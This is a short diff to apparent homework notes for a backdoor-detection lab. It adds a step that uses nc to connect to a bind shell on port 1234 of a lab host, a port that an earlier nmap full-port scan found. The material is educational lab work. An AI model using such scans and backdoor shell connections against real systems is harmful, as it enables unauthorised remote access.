@@ -14,3 +14,9 @@ tar zxvf nmap-x64.tar.gz
 #Run on student@backdoor-detection-homework:
 ./nmap -p- -n -Pn -sV -vv 192.168.200.157
 ```
+
+## h 7.3 p
+```bash
+#On student@backdoor-detection-homework:
+nc 192.168.200.157 1234 #Bind shell port found by Nmap in 7.2p
+```
